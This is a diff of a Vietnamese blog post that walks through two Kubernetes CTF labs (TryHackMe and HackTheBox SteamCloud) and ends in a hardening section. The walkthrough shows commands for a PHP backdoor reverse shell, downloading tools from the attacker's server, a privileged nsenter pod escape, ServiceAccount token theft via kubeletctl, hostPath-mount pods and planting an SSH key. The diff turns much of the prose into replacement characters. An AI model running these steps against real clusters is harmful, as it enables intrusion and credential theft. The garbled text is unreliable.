@@ -1,42 +1,42 @@
----
-title: "Tu?n 2 - Lab THM HTB v? Kubernetes"
-date: 2026-05-24 00:00:00 +0700
-categories: ["Security Research"]
-tags: ["Kubernetes", "Security", "HTB", "THM"]
----
-
+---
+title: "Tu?n 2 - Lab THM HTB v? Kubernetes"
+date: 2026-05-24 00:00:00 +0700
+categories: ["Security Research"]
+tags: ["Kubernetes", "Security", "HTB", "THM"]
+---
+
 
 ### Lab THM Frank and Herby try again.....
 
 ![](/assets/images/posts/Pasted%20image%2020260522231336.png)
 
-Bu?c d?u tiên thì quét Nmap d? tìm các attack surface
+Bu?c d?u tiï¿½n thï¿½ quï¿½t Nmap d? tï¿½m cï¿½c attack surface
 
 ![](/assets/images/posts/Pasted%20image%2020260522232951.png)
 
 
-K?t qu? quét Nmap  cho th?y m?c tiêu (IP `10.49.173.204`) dang m? khá nhi?u c?ng d?ch v? l?. Ðây có v? là m?t c?m **Kubernetes** ho?c m?t môi tru?ng container.
+K?t qu? quï¿½t Nmap  cho th?y m?c tiï¿½u (IP `10.49.173.204`) dang m? khï¿½ nhi?u c?ng d?ch v? l?. ï¿½ï¿½y cï¿½ v? lï¿½ m?t c?m **Kubernetes** ho?c m?t mï¿½i tru?ng container.
 
-Du?i dây là phân tích các c?ng dang m?:
+Du?i dï¿½y lï¿½ phï¿½n tï¿½ch cï¿½c c?ng dang m?:
 
-Các c?ng dáng chú ý
+Cï¿½c c?ng dï¿½ng chï¿½ ï¿½
 
-- **C?ng 22 (ssh)**: C?ng qu?n lý t? xa qua dòng l?nh.
-- **C?ng 10250, 10255, 10257, 10259**: Ðây là các c?ng d?c trung c?a **Kubernetes Kubelet API**.
-    - `10250`: Kubelet API (thu?ng yêu c?u xác th?c).
-    - `10255`: Read-only Kubelet API (thu?ng không yêu c?u xác th?c, có th? l? thông tin nh?y c?m).
-    - c?ng `10257` tuong ?ng v?i kube-controller-manager
-    - c?ng `10259` tuong ?ng v?i kube-scheduler trên các node m?t ph?ng di?u khi?n Kubernetes.
-- **C?ng 30679**: Ðây có th? là m?t **NodePort** (d?ch v? du?c ?ng d?ng bên trong Kubernetes dua ra ngoài).
+- **C?ng 22 (ssh)**: C?ng qu?n lï¿½ t? xa qua dï¿½ng l?nh.
+- **C?ng 10250, 10255, 10257, 10259**: ï¿½ï¿½y lï¿½ cï¿½c c?ng d?c trung c?a **Kubernetes Kubelet API**.
+    - `10250`: Kubelet API (thu?ng yï¿½u c?u xï¿½c th?c).
+    - `10255`: Read-only Kubelet API (thu?ng khï¿½ng yï¿½u c?u xï¿½c th?c, cï¿½ th? l? thï¿½ng tin nh?y c?m).
+    - c?ngï¿½`10257` tuong ?ng v?i kube-controller-manager
+    - c?ngï¿½`10259` tuong ?ng v?i kube-scheduler trï¿½n cï¿½c node m?t ph?ng di?u khi?n Kubernetes.
+- **C?ng 30679**: ï¿½ï¿½y cï¿½ th? lï¿½ m?t **NodePort** (d?ch v? du?c ?ng d?ng bï¿½n trong Kubernetes dua ra ngoï¿½i).
 
 ![](/assets/images/posts/Pasted%20image%2020260522233352.png)
 
 
-Có 1 web server port 30679 du?c expose nên tui có th? truy c?p d? xem th?
+Cï¿½ 1 web server port 30679 du?c expose nï¿½n tui cï¿½ th? truy c?p d? xem th?
 
 ![](/assets/images/posts/Pasted%20image%2020260522233502.png)
 
-Curl t?i api dó d? d?c thì th?y
+Curl t?i api dï¿½ d? d?c thï¿½ th?y
 
 ![](/assets/images/posts/Pasted%20image%2020260522234813.png)
 
@@ -44,7 +44,7 @@ Curl t?i api dó d? d?c thì th?y
 ![](/assets/images/posts/Pasted%20image%2020260522234914.png)
 
 
-**Phân tích thông tin JSON thu du?c `/pods`, ta có th? th?y có 4 pod dang ch?y trên máy:
+**Phï¿½n tï¿½ch thï¿½ng tin JSON thu du?cï¿½`/pods`, ta cï¿½ th? th?y cï¿½ 4 pod dang ch?y trï¿½n mï¿½y:
 
 ```
 calico-node             
@@ -56,14 +56,14 @@ php-deploy
 ![](/assets/images/posts/Pasted%20image%2020260522235131.png)
 
 
-Sau khi wappalyzer thì th?y web server s? d?ng php version 8.1.0 , thì ? dây tui cung dã doán du?c mình c?n RCE vào server này , và sau dó mình lên git và tìm PoC này d? có th? ch?y mã khai thác
+Sau khi wappalyzer thï¿½ th?y web server s? d?ng php version 8.1.0 , thï¿½ ? dï¿½y tui cung dï¿½ doï¿½n du?c mï¿½nh c?n RCE vï¿½o server nï¿½y , vï¿½ sau dï¿½ mï¿½nh lï¿½n git vï¿½ tï¿½m PoC nï¿½y d? cï¿½ th? ch?y mï¿½ khai thï¿½c
 https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 
 
 
 ![](/assets/images/posts/Pasted%20image%2020260522235945.png)
 
-D?ng máy l?ng nghe thì dành du?c reverse shell thành công
+D?ng mï¿½y l?ng nghe thï¿½ dï¿½nh du?c reverse shell thï¿½nh cï¿½ng
 
 ![](/assets/images/posts/Pasted%20image%2020260522235955.png)
 
@@ -74,11 +74,11 @@ D?ng máy l?ng nghe thì dành du?c reverse shell thành công
 ![](/assets/images/posts/Pasted%20image%2020260523000327.png)
 
 
-Chuy?n sang s? d?ng pwncat d? có th? t?i kubectl do ko dùng curl ho?c wget du?c 
+Chuy?n sang s? d?ng pwncat d? cï¿½ th? t?i kubectl do ko dï¿½ng curl ho?c wget du?c 
 
-Nhung  sau 1 h?i cài pwncat-cs thì thu vi?n có kh? nhi?u l?i và tui m?t cung vài ti?ng nhung cung ko th? fix du?c. Nên sau m?t h?i tham  kh?o WU c?a các pháp su nu?c ngoài  thì tui nh?n ra v?n còn cách n ày d? có th? t?i kubectl lên
+Nhung  sau 1 h?i cï¿½i pwncat-cs thï¿½ thu vi?n cï¿½ kh? nhi?u l?i vï¿½ tui m?t cung vï¿½i ti?ng nhung cung ko th? fix du?c. Nï¿½n sau m?t h?i tham  kh?o WU c?a cï¿½c phï¿½p su nu?c ngoï¿½i  thï¿½ tui nh?n ra v?n cï¿½n cï¿½ch n ï¿½y d? cï¿½ th? t?i kubectl lï¿½n
 
-Ð?m b?o b?n dang d?ng ? thu m?c ch?a file `kubectl` trên máy Kali và b?t server lên:
+ï¿½?m b?o b?n dang d?ng ? thu m?c ch?a file `kubectl` trï¿½n mï¿½y Kali vï¿½ b?t server lï¿½n:
 
 Bash
 
@@ -87,7 +87,7 @@ python3 -m http.server 80
 ```
 
 
-T?i c?a s? shell c?a container, b?n ch?y l?nh PHP này d? t?i file tr?c ti?p (nh? thay `192.168.246.92` b?ng IP VPN `tun0` hi?n t?i c?a b?n):
+T?i c?a s? shell c?a container, b?n ch?y l?nh PHP nï¿½y d? t?i file tr?c ti?p (nh? thay `192.168.246.92` b?ng IP VPN `tun0` hi?n t?i c?a b?n):
 
 Bash
 
@@ -95,21 +95,21 @@ Bash
 php -r 'copy("http://192.168.246.92/kubectl", "/tmp/kubectl");'
 ```
 
-_(B?n nhìn sang terminal máy Kali, n?u th?y dòng log `192.168.x.x - - [2026...] "GET /kubectl HTTP/1.1" 200` hi?n ra là file dã du?c t?i sang thành công mu?t mà)._
+_(B?n nhï¿½n sang terminal mï¿½y Kali, n?u th?y dï¿½ng log `192.168.x.x - - [2026...] "GET /kubectl HTTP/1.1" 200` hi?n ra lï¿½ file dï¿½ du?c t?i sang thï¿½nh cï¿½ng mu?t mï¿½)._
 
 
 
-Bây gi? c?p quy?n th?c thi cho file và ki?m tra xem Service Account trong Pod này có th? d?c du?c nh?ng gì trong c?m Kubernetes:
+Bï¿½y gi? c?p quy?n th?c thi cho file vï¿½ ki?m tra xem Service Account trong Pod nï¿½y cï¿½ th? d?c du?c nh?ng gï¿½ trong c?m Kubernetes:
 
 Bash
 
 ```
 chmod +x /tmp/kubectl
 
-# Ki?m tra danh sách Pod trong namespace hi?n t?i
+# Ki?m tra danh sï¿½ch Pod trong namespace hi?n t?i
 /tmp/kubectl get pods
 
-# Ki?m tra xem Service Account c?a b?n có nh?ng quy?n gì (R?t quan tr?ng d? bi?t du?ng leo thang)
+# Ki?m tra xem Service Account c?a b?n cï¿½ nh?ng quy?n gï¿½ (R?t quan tr?ng d? bi?t du?ng leo thang)
 /tmp/kubectl auth can-i --list
 ```
 
@@ -123,23 +123,23 @@ root@php-deploy-6d998f68b9-pj8v5:/tmp#
 
 ```
 
-Ð? truy c?p vào máy ch?, chúng ta s? ch?y l?nh sau, l?nh này có th? tìm th?y trên [HackTricks](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/abusing-roles-clusterroles-in-kubernetes#pod-create-and-escape) :
+ï¿½? truy c?p vï¿½o mï¿½y ch?, chï¿½ng ta s? ch?y l?nh sau, l?nh nï¿½y cï¿½ th? tï¿½m th?y trï¿½nï¿½[HackTricks](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/abusing-roles-clusterroles-in-kubernetes#pod-create-and-escape)ï¿½:
 
 ```
 kubectl run r00t --restart=Never -it --image something --rm --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"vulhub/php:8.1-backdoor","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
 ```
 
-Hãy cùng phân tích d? hi?u rõ di?u gì dang x?y ra:
+Hï¿½y cï¿½ng phï¿½n tï¿½ch d? hi?u rï¿½ di?u gï¿½ dang x?y ra:
 
-- `kubectl`- Vâng, rõ ràng là nó làm gì: tuong tác v?i c?m Kubernetes.
-- `run r00t`- Kh?i t?o m?t pod có tên`r00t`
-- `--restart=Never`- N?u thi?t b? d?ng ho?t d?ng, d?ng kh?i d?ng l?i nó.
-- `-it`- C?p phát m?t TTY cho container trong pod và k?t n?i `stdin`v?i nó ( _nghia là_ cho phép chúng ta tuong tác v?i container)
-- `--image something`- ? dây chúng ta c?n có hình ?nh cho pod, tuy nhiên vì nó s? b? ghi dè nên nó có th? là b?t k? hình ?nh nào.
-- `--rm`- Xóa pod sau khi nó thoát
-- `--overrides`- S? d?ng JSON n?i tuy?n d? ghi dè lên d?i tu?ng du?c t?o t? d?ng
+- `kubectl`- Vï¿½ng, rï¿½ rï¿½ng lï¿½ nï¿½ lï¿½m gï¿½: tuong tï¿½c v?i c?m Kubernetes.
+- `run r00t`- Kh?i t?o m?t pod cï¿½ tï¿½n`r00t`
+- `--restart=Never`- N?u thi?t b? d?ng ho?t d?ng, d?ng kh?i d?ng l?i nï¿½.
+- `-it`- C?p phï¿½t m?t TTY cho container trong pod vï¿½ k?t n?iï¿½`stdin`v?i nï¿½ (ï¿½_nghia lï¿½_ï¿½cho phï¿½p chï¿½ng ta tuong tï¿½c v?i container)
+- `--image something`- ? dï¿½y chï¿½ng ta c?n cï¿½ hï¿½nh ?nh cho pod, tuy nhiï¿½n vï¿½ nï¿½ s? b? ghi dï¿½ nï¿½n nï¿½ cï¿½ th? lï¿½ b?t k? hï¿½nh ?nh nï¿½o.
+- `--rm`- Xï¿½a pod sau khi nï¿½ thoï¿½t
+- `--overrides`- S? d?ng JSON n?i tuy?n d? ghi dï¿½ lï¿½n d?i tu?ng du?c t?o t? d?ng
 
-Bây gi? chúng ta s? xem xét các giá tr? mà chúng ta dang ghi dè.
+Bï¿½y gi? chï¿½ng ta s? xem xï¿½t cï¿½c giï¿½ tr? mï¿½ chï¿½ng ta dang ghi dï¿½.
 
 ```
 {
@@ -160,14 +160,14 @@ Bây gi? chúng ta s? xem xét các giá tr? mà chúng ta dang ghi dè.
 }
 ```
 
-Sau khi ch?nh s?a các giá tr? ghi dè, chúng ta có th? th?y r?ng pod s? chia s? không gian tên ID ti?n trình máy ch? ( `hostPID`), s? có m?t container s? d?ng hình ?nh mà chúng ta dã có trong node c?a mình (vì chúng ta không có quy?n truy c?p internet - chúng ta ph?i th?c hi?n thay d?i này) và s? ch?y ? ch? d? d?c quy?n.
+Sau khi ch?nh s?a cï¿½c giï¿½ tr? ghi dï¿½, chï¿½ng ta cï¿½ th? th?y r?ng pod s? chia s? khï¿½ng gian tï¿½n ID ti?n trï¿½nh mï¿½y ch? (ï¿½`hostPID`), s? cï¿½ m?t container s? d?ng hï¿½nh ?nh mï¿½ chï¿½ng ta dï¿½ cï¿½ trong node c?a mï¿½nh (vï¿½ chï¿½ng ta khï¿½ng cï¿½ quy?n truy c?p internet - chï¿½ng ta ph?i th?c hi?n thay d?i nï¿½y) vï¿½ s? ch?y ? ch? d? d?c quy?n.
 
-L?nh s? du?c th?c thi khi container kh?i d?ng là `nsenter`l?nh cho phép chúng ta ch?y m?t chuong trình trong m?t namespace khác. C? này `--mount=/proc/1/ns/mnt`cho bi?t `nsenter`s? vào namespace du?c g?n k?t (hay còn g?i là h? th?ng t?p tin) c?a ti?n trình có PID 1, t?c là `init`ti?n trình dó, có nghia là chúng ta s? th?c thi `/bin/bash`trong h? th?ng t?p tin c?a máy ch? (vì chúng ta dang tham chi?u d?n h? th?ng t?p tin `init`c?a máy ch? ch? không ph?i c?a container, do `hostPID`giá tr? c?a c?), nói cách khác, chúng ta dang ? bên trong máy ch?.
+L?nh s? du?c th?c thi khi container kh?i d?ng lï¿½`nsenter`l?nh cho phï¿½p chï¿½ng ta ch?y m?t chuong trï¿½nh trong m?t namespace khï¿½c. C? nï¿½yï¿½`--mount=/proc/1/ns/mnt`cho bi?tï¿½`nsenter`s? vï¿½o namespace du?c g?n k?t (hay cï¿½n g?i lï¿½ h? th?ng t?p tin) c?a ti?n trï¿½nh cï¿½ PID 1, t?c lï¿½`init`ti?n trï¿½nh dï¿½, cï¿½ nghia lï¿½ chï¿½ng ta s? th?c thiï¿½`/bin/bash`trong h? th?ng t?p tin c?a mï¿½y ch? (vï¿½ chï¿½ng ta dang tham chi?u d?n h? th?ng t?p tinï¿½`init`c?a mï¿½y ch? ch? khï¿½ng ph?i c?a container, doï¿½`hostPID`giï¿½ tr? c?a c?), nï¿½i cï¿½ch khï¿½c, chï¿½ng ta dang ? bï¿½n trong mï¿½y ch?.
 
-Sau dó, chúng ta l?i du?c dua vào m?t shell có quy?n root, nhung l?n này là bên trong máy ch?, vì v?y t?t c? nh?ng gì chúng ta c?n làm là l?y các c? t? `/home/herby/user.txt`và `/root/root.txt`.
+Sau dï¿½, chï¿½ng ta l?i du?c dua vï¿½o m?t shell cï¿½ quy?n root, nhung l?n nï¿½y lï¿½ bï¿½n trong mï¿½y ch?, vï¿½ v?y t?t c? nh?ng gï¿½ chï¿½ng ta c?n lï¿½m lï¿½ l?y cï¿½c c? t?ï¿½`/home/herby/user.txt`vï¿½`/root/root.txt`.
 
 
-ho?c b?n có th? t?o 1 bad pods b?ng cách này 
+ho?c b?n cï¿½ th? t?o 1 bad pods b?ng cï¿½ch nï¿½y 
 
 https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
 
@@ -209,29 +209,29 @@ https://dmaxter.pt/writeups/thm-frank-and-herby-try-again/
 ![](/assets/images/posts/Pasted%20image%2020260524221954.png)
 
 > **Ngu?n tham kh?o:** https://0xdf.gitlab.io/2022/02/14/htb-steamcloud.html  
-> **M?c tiêu h?c:** hi?u chu?i t?n công t? Kubelet API exposed ? chi?m pod ? l?y ServiceAccount token ? l?m d?ng quy?n t?o pod d? mount filesystem c?a host.
+> **M?c tiï¿½u h?c:** hi?u chu?i t?n cï¿½ng t? Kubelet API exposed ? chi?m pod ? l?y ServiceAccount token ? l?m d?ng quy?n t?o pod d? mount filesystem c?a host.
 
-### 1. T?ng quan bài lab
+### 1. T?ng quan bï¿½i lab
 
-SteamCloud là m?t máy HTB m?c Easy nhung r?t h?p d? h?c Kubernetes security vì lu?ng khai thác khá s?ch:
+SteamCloud lï¿½ m?t mï¿½y HTB m?c Easy nhung r?t h?p d? h?c Kubernetes security vï¿½ lu?ng khai thï¿½c khï¿½ s?ch:
 
 ```text
 Recon port K8s
 ? Kubelet API exposed
-? Exec vào pod nginx
+? Exec vï¿½o pod nginx
 ? L?y ServiceAccount token
-? Authenticate vào Kubernetes API
+? Authenticate vï¿½o Kubernetes API
 ? Ki?m tra RBAC
 ? T?o pod mount root filesystem c?a host
-? Ð?c root.txt / l?y root shell host
+? ï¿½?c root.txt / l?y root shell host
 ```
 
-Ði?m quan tr?ng c?a bài này không n?m ? exploit CVE, mà n?m ? **misconfiguration**:
+ï¿½i?m quan tr?ng c?a bï¿½i nï¿½y khï¿½ng n?m ? exploit CVE, mï¿½ n?m ? **misconfiguration**:
 
-- Kubelet API port `10250` có th? tuong tác t? bên ngoài.
-- Attacker có th? `exec` command vào pod dang ch?y.
-- ServiceAccount trong pod có quy?n `get`, `list`, `create pods`.
-- Quy?n `create pods` d? nguy hi?m d? t?o pod m?i có `hostPath` mount `/` c?a node.
+- Kubelet API port `10250` cï¿½ th? tuong tï¿½c t? bï¿½n ngoï¿½i.
+- Attacker cï¿½ th? `exec` command vï¿½o pod dang ch?y.
+- ServiceAccount trong pod cï¿½ quy?n `get`, `list`, `create pods`.
+- Quy?n `create pods` d? nguy hi?m d? t?o pod m?i cï¿½ `hostPath` mount `/` c?a node.
 
 ### 2. Recon
 
@@ -241,7 +241,7 @@ Scan full port:
 nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.133
 ```
 
-Các port dáng chú ý:
+Cï¿½c port dï¿½ng chï¿½ ï¿½:
 
 ```text
 22/tcp     ssh
@@ -259,7 +259,7 @@ Scan service/version:
 nmap -p 22,2379,2380,8443,10249,10250,10256 -sCV -oA scans/nmap-tcpscripts 10.10.11.133
 ```
 
-Nhìn certificate ? port `8443` th?y nhi?u d?u hi?u dây là môi tru?ng **minikube/Kubernetes**:
+Nhï¿½n certificate ? port `8443` th?y nhi?u d?u hi?u dï¿½y lï¿½ mï¿½i tru?ng **minikube/Kubernetes**:
 
 ```text
 commonName=minikube
@@ -272,12 +272,12 @@ IP Address:127.0.0.1
 K?t lu?n nhanh:
 
 - `8443`: Kubernetes API Server, c?n credential.
-- `10250`: Kubelet API, có kh? nang b? c?u hình l?ng.
-- `2379/2380`: etcd, nhung trong bài này không ph?i du?ng khai thác chính.
+- `10250`: Kubelet API, cï¿½ kh? nang b? c?u hï¿½nh l?ng.
+- `2379/2380`: etcd, nhung trong bï¿½i nï¿½y khï¿½ng ph?i du?ng khai thï¿½c chï¿½nh.
 
 ### 3. Th? Kubernetes API Server
 
-G?i API b?ng `kubectl` thì b? yêu c?u xác th?c:
+G?i API b?ng `kubectl` thï¿½ b? yï¿½u c?u xï¿½c th?c:
 
 ```bash
 kubectl --server https://10.10.11.133:8443 get pods
@@ -285,17 +285,17 @@ kubectl --server https://10.10.11.133:8443 get namespaces
 kubectl --server https://10.10.11.133:8443 cluster-info
 ```
 
-K?t qu? là `kubectl` h?i username/password ho?c tr? v? `Forbidden`, nghia là chua có credential d? di qua API Server.
+K?t qu? lï¿½ `kubectl` h?i username/password ho?c tr? v? `Forbidden`, nghia lï¿½ chua cï¿½ credential d? di qua API Server.
 
-### 4. Khai thác Kubelet API
+### 4. Khai thï¿½c Kubelet API
 
-Dùng `kubeletctl` d? tuong tác v?i Kubelet port `10250`:
+Dï¿½ng `kubeletctl` d? tuong tï¿½c v?i Kubelet port `10250`:
 
 ```bash
 kubeletctl pods -s 10.10.11.133
 ```
 
-Danh sách pod dáng chú ý:
+Danh sï¿½ch pod dï¿½ng chï¿½ ï¿½:
 
 ```text
 storage-provisioner                 kube-system
@@ -308,15 +308,15 @@ kube-scheduler-steamcloud           kube-system
 kube-proxy-562gf                    kube-system
 ```
 
-Pod `nginx` n?m trong namespace `default`, dây là m?c tiêu d? th? tru?c vì không thu?c nhóm control plane.
+Pod `nginx` n?m trong namespace `default`, dï¿½y lï¿½ m?c tiï¿½u d? th? tru?c vï¿½ khï¿½ng thu?c nhï¿½m control plane.
 
-Có th? format danh sách pod t? JSON:
+Cï¿½ th? format danh sï¿½ch pod t? JSON:
 
 ```bash
 kubeletctl runningpods -s 10.10.11.133 | jq -c '.items[].metadata | [.name, .namespace]'
 ```
 
-### 5. Exec vào pod nginx
+### 5. Exec vï¿½o pod nginx
 
 Test command execution:
 
@@ -330,16 +330,16 @@ K?t qu?:
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-? dây mình là `root` **trong container nginx**, chua ph?i root c?a host.
+? dï¿½y mï¿½nh lï¿½ `root` **trong container nginx**, chua ph?i root c?a host.
 
-Ð?c user flag:
+ï¿½?c user flag:
 
 ```bash
 kubeletctl -s 10.10.11.133 exec "ls /root" -p nginx -c nginx
 kubeletctl -s 10.10.11.133 exec "cat /root/user.txt" -p nginx -c nginx
 ```
 
-Có th? l?y interactive shell tr?c ti?p:
+Cï¿½ th? l?y interactive shell tr?c ti?p:
 
 ```bash
 kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
@@ -347,13 +347,13 @@ kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
 
 ### 6. L?y ServiceAccount token trong pod
 
-Trong Kubernetes, m?i pod thu?ng du?c mount ServiceAccount token d? nói chuy?n v?i API Server. Ki?m tra trong container:
+Trong Kubernetes, m?i pod thu?ng du?c mount ServiceAccount token d? nï¿½i chuy?n v?i API Server. Ki?m tra trong container:
 
 ```bash
 kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
 ```
 
-Các file quan tr?ng:
+Cï¿½c file quan tr?ng:
 
 ```text
 ca.crt
@@ -361,28 +361,28 @@ namespace
 token
 ```
 
-Ý nghia:
+ï¿½ nghia:
 
 - `ca.crt`: CA certificate d? trust Kubernetes API Server.
 - `namespace`: namespace hi?n t?i c?a pod.
 - `token`: bearer token c?a ServiceAccount g?n v?i pod.
 
-Luu CA cert và token v? máy attacker:
+Luu CA cert vï¿½ token v? mï¿½y attacker:
 
 ```bash
 kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee ca.crt
 kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee token
 ```
 
-Ho?c dua token vào bi?n môi tru?ng:
+Ho?c dua token vï¿½o bi?n mï¿½i tru?ng:
 
 ```bash
 export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
 ```
 
-### 7. Authenticate vào Kubernetes API b?ng token
+### 7. Authenticate vï¿½o Kubernetes API b?ng token
 
-Dùng `ca.crt` và token v?a l?y d? g?i API Server:
+Dï¿½ng `ca.crt` vï¿½ token v?a l?y d? g?i API Server:
 
 ```bash
 kubectl --server https://10.10.11.133:8443 \
@@ -391,7 +391,7 @@ kubectl --server https://10.10.11.133:8443 \
   get pods
 ```
 
-N?u thành công s? th?y pod `nginx`:
+N?u thï¿½nh cï¿½ng s? th?y pod `nginx`:
 
 ```text
 NAME    READY   STATUS    RESTARTS   AGE
@@ -407,15 +407,15 @@ kubectl auth can-i --list \
   --token=$token
 ```
 
-Dòng quan tr?ng:
+Dï¿½ng quan tr?ng:
 
 ```text
 pods    []    []    [get create list]
 ```
 
-Ðây là pivot point c?a bài: ServiceAccount không ph?i cluster-admin, nhung có quy?n **create pods** trong namespace `default`. V?i quy?n này, attacker có th? t?o pod m?i mount filesystem c?a host.
+ï¿½ï¿½y lï¿½ pivot point c?a bï¿½i: ServiceAccount khï¿½ng ph?i cluster-admin, nhung cï¿½ quy?n **create pods** trong namespace `default`. V?i quy?n nï¿½y, attacker cï¿½ th? t?o pod m?i mount filesystem c?a host.
 
-### 8. Xem c?u hình pod nginx
+### 8. Xem c?u hï¿½nh pod nginx
 
 Dump YAML c?a pod hi?n t?i:
 
@@ -426,14 +426,14 @@ kubectl get pod nginx -o yaml \
   --token=$token
 ```
 
-Thông tin c?n l?y:
+Thï¿½ng tin c?n l?y:
 
 ```yaml
 namespace: default
 image: nginx:1.14.2
 ```
 
-Ta dùng l?i image `nginx:1.14.2` vì image này dã có s?n trên node, tránh ph? thu?c internet/image pull.
+Ta dï¿½ng l?i image `nginx:1.14.2` vï¿½ image nï¿½y dï¿½ cï¿½ s?n trï¿½n node, trï¿½nh ph? thu?c internet/image pull.
 
 ### 9. T?o pod mount `/` c?a host
 
@@ -460,12 +460,12 @@ spec:
   hostNetwork: true
 ```
 
-Gi?i thích:
+Gi?i thï¿½ch:
 
-- `hostPath.path: /`: mount toàn b? root filesystem c?a node vào pod.
+- `hostPath.path: /`: mount toï¿½n b? root filesystem c?a node vï¿½o pod.
 - `mountPath: /mnt`: trong container, host filesystem xu?t hi?n t?i `/mnt`.
-- `hostNetwork: true`: pod dùng network namespace c?a host.
-- `image: nginx:1.14.2`: dùng image dã có s?n trên node.
+- `hostNetwork: true`: pod dï¿½ng network namespace c?a host.
+- `image: nginx:1.14.2`: dï¿½ng image dï¿½ cï¿½ s?n trï¿½n node.
 
 Apply pod:
 
@@ -485,31 +485,31 @@ kubectl get pods \
   --token=$token
 ```
 
-### 10. Ð?c filesystem c?a host
+### 10. ï¿½?c filesystem c?a host
 
-Exec vào pod m?i b?ng Kubelet:
+Exec vï¿½o pod m?i b?ng Kubelet:
 
 ```bash
 kubeletctl exec "id" -s 10.10.11.133 -p attacker-pod -c attacker-pod
 ```
 
-Li?t kê root filesystem c?a host:
+Li?t kï¿½ root filesystem c?a host:
 
 ```bash
 kubeletctl exec "ls /mnt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
 ```
 
-Ð?c root flag:
+ï¿½?c root flag:
 
 ```bash
 kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p attacker-pod -c attacker-pod
 ```
 
-Lúc này `/mnt` chính là `/` c?a node th?t, vì v?y `/mnt/root/root.txt` tuong ?ng v?i `/root/root.txt` trên host.
+Lï¿½c nï¿½y `/mnt` chï¿½nh lï¿½ `/` c?a node th?t, vï¿½ v?y `/mnt/root/root.txt` tuong ?ng v?i `/root/root.txt` trï¿½n host.
 
-### 11. L?y root shell trên host
+### 11. L?y root shell trï¿½n host
 
-Có th? t?o pod th? hai ch?y reverse shell ngay khi container start:
+Cï¿½ th? t?o pod th? hai ch?y reverse shell ngay khi container start:
 
 ```yaml
 apiVersion: v1
@@ -534,7 +534,7 @@ spec:
   hostNetwork: true
 ```
 
-Trên máy attacker b?t listener:
+Trï¿½n mï¿½y attacker b?t listener:
 
 ```bash
 nc -lnvp 443
@@ -549,7 +549,7 @@ kubectl apply -f attacker-shell.yaml \
   --token=$token
 ```
 
-Sau khi shell callback v?, có th? ghi SSH public key vào host root:
+Sau khi shell callback v?, cï¿½ th? ghi SSH public key vï¿½o host root:
 
 ```bash
 mkdir -p /mnt/root/.ssh
@@ -557,65 +557,65 @@ cd /mnt/root/.ssh
 echo "ssh-ed25519 <PUBLIC_KEY> attacker@kali" > authorized_keys
 ```
 
-R?i SSH vào host:
+R?i SSH vï¿½o host:
 
 ```bash
 ssh -i id_ed25519 root@10.10.11.133
 ```
 
-### 12. Vì sao quy?n `create pods` nguy hi?m?
+### 12. Vï¿½ sao quy?n `create pods` nguy hi?m?
 
-Trong Kubernetes, quy?n `create pods` có th? tr? thành quy?n leo thang r?t m?nh n?u cluster không ch?n các c?u hình nguy hi?m. Attacker có th? t?o pod v?i:
+Trong Kubernetes, quy?n `create pods` cï¿½ th? tr? thï¿½nh quy?n leo thang r?t m?nh n?u cluster khï¿½ng ch?n cï¿½c c?u hï¿½nh nguy hi?m. Attacker cï¿½ th? t?o pod v?i:
 
 - `hostPath` mount thu m?c nh?y c?m c?a node.
-- `hostNetwork: true` d? dùng network c?a host.
-- `hostPID: true` d? nhìn process c?a host.
+- `hostNetwork: true` d? dï¿½ng network c?a host.
+- `hostPID: true` d? nhï¿½n process c?a host.
 - `privileged: true` d? tang kh? nang escape.
-- ServiceAccount khác n?u có quy?n gán ho?c dùng SA m?nh hon.
+- ServiceAccount khï¿½c n?u cï¿½ quy?n gï¿½n ho?c dï¿½ng SA m?nh hon.
 
-Trong SteamCloud, ch? c?n `hostPath: /` là d? d? d?c toàn b? filesystem c?a node.
+Trong SteamCloud, ch? c?n `hostPath: /` lï¿½ d? d? d?c toï¿½n b? filesystem c?a node.
 
-### 13. Mapping v?i d? tài VDT
+### 13. Mapping v?i d? tï¿½i VDT
 
-Bài này kh?p t?t v?i hu?ng **Kubernetes privilege escalation do misconfiguration**:
+Bï¿½i nï¿½y kh?p t?t v?i hu?ng **Kubernetes privilege escalation do misconfiguration**:
 
-| Giai do?n | K? thu?t | Ý nghia trong d? tài |
+| Giai do?n | K? thu?t | ï¿½ nghia trong d? tï¿½i |
 |---|---|---|
 | Recon | Scan port K8s | Nh?n di?n API Server, Kubelet, etcd |
 | Initial Access | Kubelet anonymous/weak access | Th?c thi l?nh trong pod qua Kubelet |
 | Credential Access | ServiceAccount token | L?y credential m?c d?nh du?c mount trong pod |
-| Privilege Discovery | `kubectl auth can-i --list` | Ki?m tra quy?n RBAC hi?n có |
+| Privilege Discovery | `kubectl auth can-i --list` | Ki?m tra quy?n RBAC hi?n cï¿½ |
 | Privilege Escalation | `create pods` + `hostPath` | T?o pod d?c h?i mount filesystem host |
-| Impact | Ð?c `/root/root.txt`, SSH root | Ki?m soát node/host |
+| Impact | ï¿½?c `/root/root.txt`, SSH root | Ki?m soï¿½t node/host |
 
-### 14. Detection / Hardening rút ra
+### 14. Detection / Hardening rï¿½t ra
 
-Các di?m phòng th? nên dua vào ph?n demo ho?c báo cáo:
+Cï¿½c di?m phï¿½ng th? nï¿½n dua vï¿½o ph?n demo ho?c bï¿½o cï¿½o:
 
-- Không expose Kubelet API ra ngoài network không tin c?y.
-- T?t ho?c h?n ch? anonymous access vào Kubelet.
